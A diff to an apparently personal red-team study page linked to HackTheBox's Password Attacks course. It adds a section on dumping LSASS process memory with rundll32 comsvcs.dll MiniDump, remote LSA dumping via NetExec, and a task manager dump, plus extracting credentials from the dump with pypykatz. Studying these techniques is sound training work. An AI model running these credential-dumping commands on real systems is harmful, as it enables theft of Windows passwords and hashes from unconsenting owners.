@@ -155,6 +155,8 @@ $ hashcat -m 22100 myhash wordlist
 
 #### Credentials Gathering (Static)
 
+[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+
 If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:
 
 ```ps
@@ -170,6 +172,36 @@ Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_trans
 $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
 ```
 </div><div>
+
+#### Credential Hunting (Dynamic)
+
+[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+
+You can also dump credentials saved in process memory. There are two methods: dumping the LSA process and analyzing it on Linux OR dumping and analyzing the result on Windows.
+
+* Dump LSA Process <small>(Admin Shell Required)</small>
+
+```shell!
+$ tasklist /svc | findstr "lsa"
+lsass.exe          4242
+$ Get-Process lsass | Select Id
+  Id
+  --
+  4242
+$ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
+<detected by antivirus>
+```
+```ps
+$ nxc smb IP --local-auth -u xxx -p yyy --lsa # remote dump
+```
+
+Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'
+
+* Analyzing LSA Process Dump on Linux using [pypykatz](https://github.com/skelsec/pypykatz) <small>(2.6k ⭐)</small>
+
+```shell!
+$ pypykatz lsa minidump lsass.dmp
+```
 </div></div>
 
 <hr class="sep-both">
